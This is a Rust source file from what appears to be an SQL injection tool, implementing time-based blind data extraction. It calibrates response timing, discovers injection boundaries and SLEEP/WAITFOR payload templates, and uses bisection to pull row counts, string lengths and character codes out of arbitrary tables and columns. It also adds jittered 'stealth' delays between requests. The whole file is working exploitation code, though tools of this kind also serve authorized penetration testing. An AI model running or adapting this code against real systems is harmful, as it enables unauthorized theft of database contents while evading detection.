//! Time-based blind data extraction: bisection algorithm using SLEEP/WAITFOR
//! delays as the oracle instead of page-content differences.

use std::time::{Duration, Instant};
use tokio::time::timeout;
use anyhow::Result;
use tracing::{debug, info};

use crate::sqx::{
    detector::SqliDetector,
    models::{
        BlindExtractionConfig, BlindExtractionProgress, BlindExtractionResult,
        CancellationToken, ExtractionStatus,
    },
    payload_fetcher::{BOUNDARIES, DynamicPayloads},
};

impl SqliDetector {
    /// Extract data using time-based blind SQL injection.
    pub async fn extract_data_time_based(
        &self,
        url: &str,
        param: &str,
        original_value: &str,
        dbms: &str,
        extraction_config: &BlindExtractionConfig,
        boundary_hint: Option<&str>,
        vector: Option<&str>,
        progress_callback: Option<Box<dyn Fn(BlindExtractionProgress) + Send + Sync>>,
        cancel_token: Option<CancellationToken>,
    ) -> Result<BlindExtractionResult> {
        let start_time = Instant::now();
        let mut total_requests = 0;
        let mut extracted_values = Vec::new();

        info!(
            "Starting time-based blind extraction from {}.{}",
            extraction_config.target_table, extraction_config.target_column
        );

        if let Some(ref token) = cancel_token
            && token.is_cancelled() {
                return Ok(BlindExtractionResult {
                    extracted_values: vec![],
                    total_requests: 0,
                    extraction_time_secs: 0,
                    technique_used: "Cancelled".to_string(),
                });
            }

        // Statistical baseline: 3 samples → mean + 2σ threshold
        let (baseline_mean, baseline_stddev) = self.measure_baseline_timing(url, 3).await?;
        let adaptive_sleep = self.compute_adaptive_sleep(baseline_mean, baseline_stddev);
        self.set_adaptive_sleep(adaptive_sleep);
        let threshold = baseline_mean + baseline_stddev * 2;
        total_requests += 3;
        info!(
            "Baseline timing: mean={:?}, stddev={:?}, threshold={:?}, sleep={}s",
            baseline_mean, baseline_stddev, threshold, adaptive_sleep
        );

        // Discover boundary if no hint provided.
        let (close, balance) = if let Some(hint) = boundary_hint {
            if let Some((c, b)) = DynamicPayloads::find_boundary(hint) {
                info!("Using hinted boundary '{}' for time-based extraction", hint);
                (c, b)
            } else {
                info!("Boundary hint '{}' not found, attempting discovery", hint);
                self.discover_boundary_time_based(url, param, original_value, dbms, threshold)
                    .await?
                    .unwrap_or_else(|| ("'".to_string(), "-- ".to_string()))
            }
        } else {
            self.discover_boundary_time_based(url, param, original_value, dbms, threshold)
                .await?
                .unwrap_or_else(|| {
                    if original_value.parse::<i64>().is_ok() {
                        ("".to_string(), "-- ".to_string())
                    } else {
                        ("'".to_string(), "-- ".to_string())
                    }
                })
        };

        // Discover working time payload template (dialect or fetched fallback).
        let time_template = if let Some(v) = vector {
             v.to_string()
        } else {
            self.discover_time_payload(url, param, original_value, dbms, &close, &balance, threshold).await
        };

        let row_count = self
            .get_row_count_time_based(
                url, param, original_value, dbms, extraction_config,
                &close, &balance, &time_template, vector,
                &mut total_requests, cancel_token.as_ref(), threshold,
            )
            .await?;

        let rows_to_extract = row_count.min(extraction_config.max_rows);

        for row_index in 0..rows_to_extract {
            if let Some(ref token) = cancel_token
                && token.is_cancelled() {
                    break;
                }

            let value = self
                .extract_string_time_based(
                    url, param, original_value, dbms, extraction_config,
                    row_index, &close, &balance, &time_template, vector,
                    &mut total_requests,
                    progress_callback.as_ref(), cancel_token.as_ref(), threshold,
                )
                .await?;

            if !value.is_empty() {
                extracted_values.push(value.clone());
                if let Some(ref callback) = progress_callback {
                    callback(BlindExtractionProgress {
                        current_value_index: row_index + 1,
                        current_char_index: value.len(),
                        extracted_so_far: value,
                        total_requests,
                        status: ExtractionStatus::Running,
                    });
                }
            }
        }

        let elapsed = start_time.elapsed();
        let is_cancelled = cancel_token.as_ref().map(|t| t.is_cancelled()).unwrap_or(false);

        Ok(BlindExtractionResult {
            extracted_values,
            total_requests,
            extraction_time_secs: elapsed.as_secs(),
            technique_used: if is_cancelled {
                "TimeBased(Stopped)".to_string()
            } else {
                "TimeBased".to_string()
            },
        })
    }

    /// Attempt to discover a working boundary for time-based extraction.
    pub(crate) async fn discover_boundary_time_based(
        &self,
        url: &str,
        param: &str,
        original_value: &str,
        dbms: &str,
        threshold: Duration,
    ) -> Result<Option<(String, String)>> {
        let is_numeric = original_value.parse::<i64>().is_ok();

        for boundary in BOUNDARIES.iter() {
            if !is_numeric && boundary.close.is_empty() { continue; }

            let payload = format!("{}{} AND 1=1 {}",
                original_value, boundary.close, boundary.balance);
            if self.is_time_delayed(url, param, original_value, dbms, &payload, threshold).await {
                debug!(
                    "Discovered working boundary for time-based extraction: {} ({})",
                    boundary.label, boundary.close
                );
                return Ok(Some((
                    boundary.close.to_string(),
                    boundary.balance.to_string(),
                )));
            }
            tokio::time::sleep(crate::sqx::stealth::jittered_delay(self.config.delay_ms, self.config.stealth.jitter_pct)).await;
        }

        let dynamic = DynamicPayloads::load();
        for b in &dynamic.boundaries {
            if !is_numeric && b.prefix.is_empty() { continue; }

            let payload = format!("{}{}{}{}", original_value, b.prefix, "1=1", b.suffix);
            if self.is_time_delayed(url, param, original_value, dbms, &payload, threshold).await {
                debug!(
                    "Discovered working dynamic boundary for time-based extraction: dyn:{}",
                    b.prefix
                );
                return Ok(Some((b.prefix.clone(), b.suffix.clone())));
            }
            tokio::time::sleep(crate::sqx::stealth::jittered_delay(self.config.delay_ms, self.config.stealth.jitter_pct)).await;
        }

        Ok(None)
    }

    /// Discover the best time-payload template for the target DBMS.
    /// Returns a template string containing `{}` where the condition goes.
    pub(crate) async fn discover_time_payload(
        &self,
        url: &str,
        param: &str,
        original_value: &str,
        dbms: &str,
        close: &str,
        balance: &str,
        threshold: Duration,
    ) -> String {
        let sleep_secs = self.sleep_duration_secs();

        // 1. Try dialect conditional_sleep first.
        let dialect_box = crate::sqx::dbms::dialect_by_name(dbms);
        let dialect = dialect_box.as_deref().unwrap_or(&crate::sqx::dbms::major::MySQL);
        let conditional = dialect.conditional_sleep("1=1", sleep_secs);
        if !conditional.is_empty() {
            let payload = format!("{}{} AND {} {}", original_value, close, conditional, balance);
            if self.is_time_delayed(url, param, original_value, dbms, &payload, threshold).await {
                debug!("Dialect conditional_sleep works for time-based extraction");
                return format!("{}{} AND {{}} {}", original_value, close, balance);
            }
        }

        // 2. Try fetched time-payload tests (stype=5) from sqlmap XML.
        let dynamic = DynamicPayloads::load();
        let time_tests: Vec<_> = dynamic.tests.iter().filter(|t| t.stype == 5).collect();

        for test in time_tests {
            let suffix = &test.request_payload;
            let payload = if suffix.contains("[INFERENCE]") {
                let filled = suffix.replace("[INFERENCE]", "1=1").replace("[SLEEPTIME]", "5");
                format!("{}{} AND {} {}", original_value, close, filled, balance)
            } else {
                format!("{}{} AND {} {}", original_value, close, suffix, balance)
            };
            if self.is_time_delayed(url, param, original_value, dbms, &payload, threshold).await {
                debug!("Fetched time payload works: {}", test.title);
                return if suffix.contains("[INFERENCE]") {
                    format!("{}{} AND {} {}", original_value, close, suffix.replace("[INFERENCE]", "{}").replace("[SLEEPTIME]", "5"), balance)
                } else {
                    format!("{}{} AND {} {}", original_value, close, suffix, balance)
                };
            }
            tokio::time::sleep(crate::sqx::stealth::jittered_delay(self.config.delay_ms, self.config.stealth.jitter_pct)).await;
        }

        // 3. Fallback to dialect template (even if calibration failed, it's our best guess).
        format!("{}{} AND {{}} {}", original_value, close, balance)
    }

    /// Helper: send a payload and return true if it triggered a time delay.
    async fn is_time_delayed(
        &self,
        url: &str,
        param: &str,
        original_value: &str,
        _dbms: &str,
        payload: &str,
        threshold: Duration,
    ) -> bool {
        let sleep_secs = self.sleep_duration_secs();
        let test_url = self.build_test_url(url, param, original_value, payload);
        let start = Instant::now();
        match timeout(Duration::from_secs(10 + sleep_secs), self.send_request(&test_url)).await {
            Ok(Ok(_)) => {
                let duration = start.elapsed();
                let detection_threshold = threshold + Duration::from_secs(sleep_secs / 2);
                duration > detection_threshold
            }
            Ok(Err(_)) => false,
            Err(_) => true, // Timeout → SLEEP executed → delayed
        }
    }

    /// Get row count using time-based technique.
    pub(crate) async fn get_row_count_time_based(
        &self,
        url: &str,
        param: &str,
        original_value: &str,
        dbms: &str,
        config: &BlindExtractionConfig,
        close: &str,
        balance: &str,
        time_template: &str,
        vector: Option<&str>,
        request_count: &mut usize,
        cancel_token: Option<&CancellationToken>,
        threshold: Duration,
    ) -> Result<usize> {
        if let Some(token) = cancel_token
            && token.is_cancelled() {
                return Ok(0);
            }

        let query = format!("(SELECT COUNT(*) FROM {})", config.target_table);
        let count = self
            .extract_number_time_based(
                url, param, original_value, dbms, &query,
                close, balance, time_template, vector,
                0, 9999, request_count, cancel_token, threshold,
            )
            .await?;

        Ok(count as usize)
    }

    /// Extract string using time-based technique.
    pub(crate) async fn extract_string_time_based(
        &self,
        url: &str,
        param: &str,
        original_value: &str,
        dbms: &str,
        config: &BlindExtractionConfig,
        row_index: usize,
        close: &str,
        balance: &str,
        time_template: &str,
        vector: Option<&str>,
        request_count: &mut usize,
        progress_callback: Option<&Box<dyn Fn(BlindExtractionProgress) + Send + Sync>>,
        cancel_token: Option<&CancellationToken>,
        threshold: Duration,
    ) -> Result<String> {
        let mut result = String::new();

        let subquery = if let Some(ref custom) = config.custom_query {
            format!("({})", custom)
        } else {
            format!(
                "(SELECT {} FROM {}{} LIMIT 1 OFFSET {})",
                config.target_column,
                config.target_table,
                config
                    .where_clause
                    .as_ref()
                    .map(|w| format!(" WHERE {}", w))
                    .unwrap_or_default(),
                row_index
            )
        };

        if let Some(token) = cancel_token
            && token.is_cancelled() {
                return Ok(result);
            }

        let length_query = format!("LENGTH({})", subquery);
        let length = self
            .extract_number_time_based(
                url, param, original_value, dbms, &length_query,
                close, balance, time_template, vector,
                0, config.max_length_per_value as i32, request_count,
                cancel_token, threshold,
            )
            .await?;

        for pos in 1..=length {
            if let Some(token) = cancel_token
                && token.is_cancelled() {
                    return Ok(result);
                }

            let dialect_box = crate::sqx::dbms::dialect_by_name(dbms);
            let dialect = dialect_box.as_deref().unwrap_or(&crate::sqx::dbms::major::MySQL);
            let char_query = format!(
                "{}({}({}, {}, 1))",
                dialect.char_code_function(),
                dialect.substring_function(),
                subquery,
                pos
            );
            let ascii_val = self
                .extract_number_time_based(
                    url, param, original_value, dbms, &char_query,
                    close, balance, time_template, vector,
                    0, 127, request_count, cancel_token, threshold,
                )
                .await?;

            if let Some(ch) = char::from_u32(ascii_val as u32) {
                result.push(ch);
                if let Some(callback) = progress_callback {
                    callback(BlindExtractionProgress {
                        current_value_index: row_index,
                        current_char_index: pos as usize,
                        extracted_so_far: result.clone(),
                        total_requests: *request_count,
                        status: ExtractionStatus::Running,
                    });
                }
            }
        }

        Ok(result)
    }

    /// Extract a number using time-based bisection.
    pub(crate) async fn extract_number_time_based(
        &self,
        url: &str,
        param: &str,
        original_value: &str,
        dbms: &str,
        query: &str,
        close: &str,
        balance: &str,
        time_template: &str,
        vector: Option<&str>,
        min_val: i32,
        max_val: i32,
        request_count: &mut usize,
        cancel_token: Option<&CancellationToken>,
        threshold: Duration,
    ) -> Result<i32> {
        let mut low = min_val;
        let mut high = max_val;

        while low < high {
            if let Some(token) = cancel_token
                && token.is_cancelled() {
                    return Ok(low);
                }

            let mid = low + (high - low) / 2;

            let condition = format!("{} > {}", query, mid);
            let is_greater = self
                .test_condition_time_based(
                    url, param, original_value, dbms, &condition,
                    close, balance, time_template, vector, threshold,
                )
                .await?;
            *request_count += 1;

            if is_greater {
                low = mid + 1;
            } else {
                high = mid;
            }

            tokio::time::sleep(crate::sqx::stealth::jittered_delay(self.config.delay_ms, self.config.stealth.jitter_pct)).await;
        }

        Ok(low)
    }

    /// Test a condition using time-based technique.
    pub(crate) async fn test_condition_time_based(
        &self,
        url: &str,
        param: &str,
        original_value: &str,
        dbms: &str,
        condition: &str,
        close: &str,
        balance: &str,
        time_template: &str,
        vector: Option<&str>,
        threshold: Duration,
    ) -> Result<bool> {
        let sleep_secs = self.sleep_duration_secs();

        let payload = if let Some(v) = vector {
             v.replace("[INFERENCE]", condition).replace("[SLEEPTIME]", &sleep_secs.to_string())
        } else if time_template.contains("{}") {
            time_template.replace("{}", condition)
        } else {
            let dialect_box = crate::sqx::dbms::dialect_by_name(dbms);
            let dialect = dialect_box.as_deref().unwrap_or(&crate::sqx::dbms::major::MySQL);
            let conditional = dialect.conditional_sleep(condition, sleep_secs);
            format!("{}{} AND {} {}", original_value, close, conditional, balance)
        };

        let test_url = self.build_test_url(url, param, original_value, &payload);

        let start = Instant::now();
        match timeout(Duration::from_secs(10 + sleep_secs), self.send_request(&test_url)).await {
            Ok(Ok(_)) => {
                let duration = start.elapsed();
                let detection_threshold = threshold + Duration::from_secs(sleep_secs / 2);
                Ok(duration > detection_threshold)
            }
            Ok(Err(_)) => Ok(false),
            Err(_) => Ok(true),
        }
    }
}
